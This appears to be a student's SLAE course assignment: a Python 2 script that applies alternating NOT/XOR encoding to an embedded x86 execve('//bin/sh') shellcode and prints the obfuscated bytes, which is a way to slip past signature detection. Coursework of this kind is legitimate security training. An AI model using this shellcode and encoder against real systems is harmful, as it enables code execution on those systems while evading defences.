#!/usr/bin/env python

# SLAE Assigment4 - Custom encoder
# Author: rtmcx (rtmcx@protonmail.com)

# Python NOT/XOR encoder

import sys, struct

# The shellcode to be encoded  "Execve ('//bin/sh')"
shellcode = ("\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")


# We will output the encoded shellcode in two formats:
# \x00 and 0x00 for use in different situations.
encoded = ""
encoded2 = ""

print "Encoding shellcode..."
shellcode_length =  len(bytearray(shellcode))

counter = shellcode_length 

# Loop through each byte and encode it
for x in bytearray(shellcode):
	if (counter % 2 == 1):
		# ODD, NOT-encode
		y = ~x		
	else:
		y = x^counter 				
		
	byte = (y & 0xFF) # Make the byte positive if neg.
	
	if (byte == 0):
		print "[!] NULL byte detected in encoded shellcode, aborting!" 
		print "[!] Please alter the input shellcode so that the encoded shellcode is NULL-free!" 
		print "[!] The byte position is the %d:th byte" % (shellcode_length- counter+1)
		#break
		sys.exit()
	
	encoded += "\\x" 
	encoded += "%02x" % byte

	encoded2 += "0x"
	encoded2 += "%02x," % byte 
 	counter = counter - 1

print encoded
print encoded2

print "Length: %d" % shellcode_length #len(bytearray(shellcode))
